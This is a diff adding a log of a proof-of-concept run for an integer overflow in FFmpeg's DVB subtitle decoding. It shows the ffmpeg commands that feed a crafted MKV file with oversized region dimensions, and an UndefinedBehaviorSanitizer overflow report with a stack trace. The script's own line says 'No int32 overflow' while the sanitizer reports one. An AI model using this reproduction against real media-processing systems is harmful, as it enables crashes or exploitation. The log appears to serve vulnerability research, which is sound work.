@@ -1,0 +1,110 @@
+=== VULN-001 PoC: copy_av_subtitle integer overflow ===
+Binary: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
+
+[*] Step 1: Small dimensions (200x200) - code path reachability
+[+] Written vuln_001_input.mkv (348 bytes)
+[+] DVB-Sub region dimensions: 200 x 200
+[+] h*linesize product: 40000 (0.00 GB)
+[-] No int32 overflow (product < INT_MAX)
+[+] Command: ffmpeg -y -f lavfi -i "color=black:320x240:rate=1:duration=5" -fix_sub_duration -i vuln_001_input.mkv -map 0:v -map 1:s -c:v mpeg2video -c:s dvbsub -fix_sub_duration_heartbeat -f mpegts /dev/null
+
+[*] Running ffmpeg (small dims, with -fix_sub_duration) ...
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+Input #0, lavfi, from 'color=black:320x240:rate=1:duration=5':
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #0:0: Video: wrapped_avframe, yuv420p, 320x240 [SAR 1:1 DAR 4:3], 1 fps, 1 tbr, 1 tbn
+Input #1, matroska,webm, from 'vuln_001_input.mkv':
+  Metadata:
+    encoder         : vuln001_poc
+  Duration: 00:00:10.00, start: 0.000000, bitrate: 0 kb/s
+  Stream #1:0(eng): Video: vp8, yuv420p, 320x240, SAR 1:1 DAR 4:3, 30 fps, 30 tbr, 1k tbn (default)
+  Stream #1:1(eng): Subtitle: dvb_subtitle (dvbsub) (default)
+Stream mapping:
+  Stream #0:0 -> #0:0 (wrapped_avframe (native) -> mpeg2video (native))
+  Stream #1:1 -> #0:1 (dvb_subtitle (dvbsub) -> dvb_subtitle (dvbsub))
+Press [q] to stop, [?] for help
+[mpeg2video @ 0x519000005080] too many threads/slices (16), reducing to 15
+Output #0, mpegts, to '/dev/null':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0: Video: mpeg2video (Main), yuv420p(tv, progressive), 320x240 [SAR 1:1 DAR 4:3], q=2-31, 200 kb/s, 1 fps, 90k tbn
+    Metadata:
+      encoder         : Lavc63.11.100 mpeg2video
+    Side data:
+      CPB properties: bitrate max/min/avg: 0/0/200000 buffer size: 0 vbv_delay: N/A
+  Stream #0:1(eng): Subtitle: dvb_subtitle (default)
+    Metadata:
+      encoder         : Lavc63.11.100 dvbsub
+[out#0/mpegts @ 0x511000003740] video:2KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 179.823594%
+frame=    5 fps=0.0 q=2.0 Lsize=       5KiB time=00:00:04.00 bitrate=  10.2kbits/s speed= 159x elapsed=0:00:00.02    
+
+
+[*] Step 2: Large dimensions (32767x40000) - overflow stress
+[+] Written vuln_001_input.mkv (348 bytes)
+[+] DVB-Sub region dimensions: 32767 x 40000
+[+] h*linesize product: 1310680000 (1.22 GB)
+[-] No int32 overflow (product < INT_MAX)
+[+] Command: ffmpeg -y -f lavfi -i "color=black:320x240:rate=1:duration=5" -fix_sub_duration -i vuln_001_input.mkv -map 0:v -map 1:s -c:v mpeg2video -c:s dvbsub -fix_sub_duration_heartbeat -f mpegts /dev/null
+
+[*] Running ffmpeg (large dims, with -fix_sub_duration) ...
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+Input #0, lavfi, from 'color=black:320x240:rate=1:duration=5':
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #0:0: Video: wrapped_avframe, yuv420p, 320x240 [SAR 1:1 DAR 4:3], 1 fps, 1 tbr, 1 tbn
+Input #1, matroska,webm, from 'vuln_001_input.mkv':
+  Metadata:
+    encoder         : vuln001_poc
+  Duration: 00:00:10.00, start: 0.000000, bitrate: 0 kb/s
+  Stream #1:0(eng): Video: vp8, yuv420p, 320x240, SAR 1:1 DAR 4:3, 30 fps, 30 tbr, 1k tbn (default)
+  Stream #1:1(eng): Subtitle: dvb_subtitle (dvbsub) (default)
+Stream mapping:
+  Stream #0:0 -> #0:0 (wrapped_avframe (native) -> mpeg2video (native))
+  Stream #1:1 -> #0:1 (dvb_subtitle (dvbsub) -> dvb_subtitle (dvbsub))
+Press [q] to stop, [?] for help
+src/libavcodec/dvbsubdec.c:1192:52: runtime error: signed integer overflow: 1310680000 * 2 cannot be represented in type 'int'
+[mpeg2video @ 0x519000005080] too many threads/slices (16), reducing to 15
+Output #0, mpegts, to '/dev/null':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0: Video: mpeg2video (Main), yuv420p(tv, progressive), 320x240 [SAR 1:1 DAR 4:3], q=2-31, 200 kb/s, 1 fps, 90k tbn
+    Metadata:
+      encoder         : Lavc63.11.100 mpeg2video
+    Side data:
+      CPB properties: bitrate max/min/avg: 0/0/200000 buffer size: 0 vbv_delay: N/A
+  Stream #0:1(eng): Subtitle: dvb_subtitle (default)
+    Metadata:
+      encoder         : Lavc63.11.100 dvbsub
+    #0 0x591e6e5dabb2 in dvbsub_parse_region_segment (/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg+0xf312bb2) (BuildId: 699c14b73a68f21ee7529845ae236f6d643f99ef)
+    #1 0x591e6e5e0b82 in dvbsub_decode (/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg+0xf318b82) (BuildId: 699c14b73a68f21ee7529845ae236f6d643f99ef)
+    #2 0x591e6e47edc9 in avcodec_decode_subtitle2 (/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg+0xf1b6dc9) (BuildId: 699c14b73a68f21ee7529845ae236f6d643f99ef)
+    #3 0x591e6b5282ad in transcode_subtitles (/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg+0xc2602ad) (BuildId: 699c14b73a68f21ee7529845ae236f6d643f99ef)
+    #4 0x591e6b528cf5 in packet_decode (/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg+0xc260cf5) (BuildId: 699c14b73a68f21ee7529845ae236f6d643f99ef)
+    #5 0x591e6b52c2fd in decoder_thread (/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg+0xc2642fd) (BuildId: 699c14b73a68f21ee7529845ae236f6d643f99ef)
+    #6 0x591e6b649a96 in task_wrapper (/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg+0xc381a96) (BuildId: 699c14b73a68f21ee7529845ae236f6d643f99ef)
+    #7 0x7542d465ea41 in asan_thread_start ../../../../src/libsanitizer/asan/asan_interceptors.cpp:234
+    #8 0x7542d3a9caa3 in start_thread nptl/pthread_create.c:447
+    #9 0x7542d3b29c3b in clone3 ../sysdeps/unix/sysv/linux/x86_64/clone3.S:78
+
+frame=    5 fps=0.0 q=2.0 size=       0KiB time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.50    frame=    5 fps=5.0 q=2.0 size=       0KiB time=N/A bitrate=N/A speed=N/A elapsed=0:00:01.00    frame=    5 fps=3.3 q=2.0 size=       0KiB time=N/A bitrate=N/A speed=N/A elapsed=0:00:01.50    [out#0/mpegts @ 0x511000003740] video:2KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 179.823594%
+frame=    5 fps=3.2 q=2.0 Lsize=       5KiB time=00:00:04.00 bitrate=  10.2kbits/s speed= 2.6x elapsed=0:00:01.54    
+
+
+=== Done ===
